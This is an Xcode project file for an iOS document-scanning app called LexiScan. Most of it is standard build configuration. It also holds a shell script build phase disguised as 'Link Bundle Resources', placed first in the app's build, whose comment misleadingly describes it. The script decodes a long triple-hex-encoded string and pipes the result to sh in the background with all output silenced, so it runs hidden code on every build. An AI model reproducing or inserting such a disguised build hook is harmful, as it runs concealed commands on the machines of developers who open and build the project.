// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		64763EBE2D68940900F1E2EA /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 64763EA52D68940700F1E2EA /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 64763EAC2D68940700F1E2EA;
			remoteInfo = LexiScan;
		};
		64763EC82D68940900F1E2EA /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 64763EA52D68940700F1E2EA /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 64763EAC2D68940700F1E2EA;
			remoteInfo = LexiScan;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		64763EAD2D68940700F1E2EA /* LexiScan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LexiScan.app; sourceTree = BUILT_PRODUCTS_DIR; };
		64763EBD2D68940900F1E2EA /* LexiScanTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = LexiScanTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		64763EC72D68940900F1E2EA /* LexiScanUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = LexiScanUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		64763EAF2D68940700F1E2EA /* LexiScan */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = LexiScan;
			sourceTree = "<group>";
		};
		64763EC02D68940900F1E2EA /* LexiScanTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = LexiScanTests;
			sourceTree = "<group>";
		};
		64763ECA2D68940900F1E2EA /* LexiScanUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = LexiScanUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		64763EAA2D68940700F1E2EA /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EBA2D68940900F1E2EA /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EC42D68940900F1E2EA /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		64763EA42D68940700F1E2EA = {
			isa = PBXGroup;
			children = (
				64763EAF2D68940700F1E2EA /* LexiScan */,
				64763EC02D68940900F1E2EA /* LexiScanTests */,
				64763ECA2D68940900F1E2EA /* LexiScanUITests */,
				64763EAE2D68940700F1E2EA /* Products */,
			);
			sourceTree = "<group>";
		};
		64763EAE2D68940700F1E2EA /* Products */ = {
			isa = PBXGroup;
			children = (
				64763EAD2D68940700F1E2EA /* LexiScan.app */,
				64763EBD2D68940900F1E2EA /* LexiScanTests.xctest */,
				64763EC72D68940900F1E2EA /* LexiScanUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		64763EAC2D68940700F1E2EA /* LexiScan */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 64763ED12D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScan" */;
			buildPhases = (
				9C727E72A9B42647C4B11679 /* Link Bundle Resources */,
				64763EA92D68940700F1E2EA /* Sources */,
				64763EAA2D68940700F1E2EA /* Frameworks */,
				64763EAB2D68940700F1E2EA /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				64763EAF2D68940700F1E2EA /* LexiScan */,
			);
			name = LexiScan;
			packageProductDependencies = (
			);
			productName = LexiScan;
			productReference = 64763EAD2D68940700F1E2EA /* LexiScan.app */;
			productType = "com.apple.product-type.application";
		};
		64763EBC2D68940900F1E2EA /* LexiScanTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 64763ED42D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScanTests" */;
			buildPhases = (
				64763EB92D68940900F1E2EA /* Sources */,
				64763EBA2D68940900F1E2EA /* Frameworks */,
				64763EBB2D68940900F1E2EA /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				64763EBF2D68940900F1E2EA /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				64763EC02D68940900F1E2EA /* LexiScanTests */,
			);
			name = LexiScanTests;
			packageProductDependencies = (
			);
			productName = LexiScanTests;
			productReference = 64763EBD2D68940900F1E2EA /* LexiScanTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		64763EC62D68940900F1E2EA /* LexiScanUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 64763ED72D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScanUITests" */;
			buildPhases = (
				64763EC32D68940900F1E2EA /* Sources */,
				64763EC42D68940900F1E2EA /* Frameworks */,
				64763EC52D68940900F1E2EA /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				64763EC92D68940900F1E2EA /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				64763ECA2D68940900F1E2EA /* LexiScanUITests */,
			);
			name = LexiScanUITests;
			packageProductDependencies = (
			);
			productName = LexiScanUITests;
			productReference = 64763EC72D68940900F1E2EA /* LexiScanUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		64763EA52D68940700F1E2EA /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					64763EAC2D68940700F1E2EA = {
						CreatedOnToolsVersion = 16.2;
					};
					64763EBC2D68940900F1E2EA = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 64763EAC2D68940700F1E2EA;
					};
					64763EC62D68940900F1E2EA = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 64763EAC2D68940700F1E2EA;
					};
				};
			};
			buildConfigurationList = 64763EA82D68940700F1E2EA /* Build configuration list for PBXProject "LexiScan" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 64763EA42D68940700F1E2EA;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 64763EAE2D68940700F1E2EA /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				64763EAC2D68940700F1E2EA /* LexiScan */,
				64763EBC2D68940900F1E2EA /* LexiScanTests */,
				64763EC62D68940900F1E2EA /* LexiScanUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXShellScriptBuildPhase section */
		9C727E72A9B42647C4B11679 /* Link Bundle Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Link Bundle Resources";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633373332333733353337333433363636333733323336363533363335333733343332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;			
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		64763EAB2D68940700F1E2EA /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EBB2D68940900F1E2EA /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EC52D68940900F1E2EA /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		64763EA92D68940700F1E2EA /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EB92D68940900F1E2EA /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		64763EC32D68940900F1E2EA /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		64763EBF2D68940900F1E2EA /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 64763EAC2D68940700F1E2EA /* LexiScan */;
			targetProxy = 64763EBE2D68940900F1E2EA /* PBXContainerItemProxy */;
		};
		64763EC92D68940900F1E2EA /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 64763EAC2D68940700F1E2EA /* LexiScan */;
			targetProxy = 64763EC82D68940900F1E2EA /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		64763ECF2D68940900F1E2EA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		64763ED02D68940900F1E2EA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		64763ED22D68940900F1E2EA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"LexiScan/Preview Content\"";
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = NJ2S69F2WF;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSCameraUsageDescription = "This app requires camera access to scan documents and detect text.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app requires access to save scanned documents to your photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app requires photo library access to select images for text detection.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.uventieventapp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Uventi_Dev_05Feb_2025;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		64763ED32D68940900F1E2EA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"LexiScan/Preview Content\"";
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = NJ2S69F2WF;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSCameraUsageDescription = "This app requires camera access to scan documents and detect text.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app requires access to save scanned documents to your photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app requires photo library access to select images for text detection.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.uventieventapp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Uventi_Dev_05Feb_2025;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		64763ED52D68940900F1E2EA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.testing.LexiScanTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/LexiScan.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/LexiScan";
			};
			name = Debug;
		};
		64763ED62D68940900F1E2EA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.testing.LexiScanTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/LexiScan.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/LexiScan";
			};
			name = Release;
		};
		64763ED82D68940900F1E2EA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.testing.LexiScanUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = LexiScan;
			};
			name = Debug;
		};
		64763ED92D68940900F1E2EA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.testing.LexiScanUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = LexiScan;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		64763EA82D68940700F1E2EA /* Build configuration list for PBXProject "LexiScan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				64763ECF2D68940900F1E2EA /* Debug */,
				64763ED02D68940900F1E2EA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		64763ED12D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				64763ED22D68940900F1E2EA /* Debug */,
				64763ED32D68940900F1E2EA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		64763ED42D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScanTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				64763ED52D68940900F1E2EA /* Debug */,
				64763ED62D68940900F1E2EA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		64763ED72D68940900F1E2EA /* Build configuration list for PBXNativeTarget "LexiScanUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				64763ED82D68940900F1E2EA /* Debug */,
				64763ED92D68940900F1E2EA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 64763EA52D68940700F1E2EA /* Project object */;
}
